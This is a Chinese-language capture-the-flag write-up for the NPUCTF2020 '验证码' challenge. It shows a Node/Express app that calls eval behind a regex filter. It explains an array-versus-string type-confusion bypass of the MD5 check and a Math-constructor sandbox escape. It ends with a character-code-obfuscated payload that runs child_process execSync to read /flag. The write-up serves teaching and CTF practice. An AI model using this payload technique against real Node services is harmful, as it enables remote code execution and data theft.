# NPUCTF2020 验证码

## 知识点

1. javascript 原型链污染
2. js的弱类型比较（语言特性）
3. js的匿名函数

## 解题

```javascript
const express = require('express');
const bodyParser = require('body-parser');
const cookieSession = require('cookie-session');

const fs = require('fs');
const crypto = require('crypto');

const keys = require('./key.js').keys;

function md5(s) {
  return crypto.createHash('md5')
    .update(s)
    .digest('hex');
}

function saferEval(str) {
  if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&|^%<>=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, '')) {
    return null;
  }
  return eval(str);
} // 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个

const template = fs.readFileSync('./index.html').toString();
function render(results) {
  return template.replace('{{results}}', results.join('<br/>'));
}

const app = express();

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.use(cookieSession({
  name: 'PHPSESSION', // 2020.3/WORKER2 嘿嘿，给👴爪⑧
  keys
}));

Object.freeze(Object);
Object.freeze(Math);

app.post('/', function (req, res) {
  let result = '';
  const results = req.session.results || [];
  const { e, first, second } = req.body;
  if (first && second && first.length === second.length && first!==second && md5(first+keys[0]) === md5(second+keys[0])) {
    if (req.body.e) {
      try {
        result = saferEval(req.body.e) || 'Wrong Wrong Wrong!!!';
      } catch (e) {
        console.log(e);
        result = 'Wrong Wrong Wrong!!!';
      }
      results.unshift(`${req.body.e}=${result}`);
    }
  } else {
    results.unshift('Not verified!');
  }
  if (results.length > 13) {
    results.pop();
  }
  req.session.results = results;
  res.send(render(req.session.results));
});

// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI
app.get('/source', function (req, res) {
  res.set('Content-Type', 'text/javascript;charset=utf-8');
  res.send(fs.readFileSync('./index.js'));
});

app.get('/', function (req, res) {
  res.set('Content-Type', 'text/html;charset=utf-8');
  req.session.admin = req.session.admin || 0;
  res.send(render(req.session.results = req.session.results || []))
});

app.listen(80, '0.0.0.0', () => {
  console.log('Start listening')
});
```

看到源码，注意到 `pp.use(bodyParser.json());`，可以判断使用json进行解析

其次对于 first 及 second，要满足

```javascript
first && second && first.length === second.length && first!==second && md5(first+keys[0]) === md5(second+keys[0])
```

首先要了解js对传入数据为数组的形式进行属性判断时，需要拆出其中的值
例如

```text
first = 1                                        first = 1
                =>  first != second  =>                         => first.length === second.length (undefined)
second = [1]                                     second = 1
```

可得 payload 的一部分

```text
{"first": "1", "second":[1]}
```

其次对于e，要满足

```javascript
if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&|^%<>=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, '')) {
    return null;
  }
```

可得e只能出现 `()+\-*/&|^%<>=,?:` 及 `Math`

这个可以考虑到node中常见的原型链污染及rce

既然只可出现 `()+\-*/&|^%<>=,?:` 及 `Math`，可利用其组成js中的匿名函数

```javascript
x => x*x === function(x) {return x*x};
```

其次对于原型链

```text
Math.constructor => Object => constructor => Function => use function based Objcet
(Math + 1).constructor => String => constructor => Function => use function based String
```

所以可得要实现无字母的rce，可利用 Math.fromCharCode 函数，但是这个要求基于String，否则抛出错误，恰好满足条件，构造payload

```text
{"e":"(Math=>(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)"}
```

post得到flag


## 总结

还是要学js和node呀，js太灵活了...
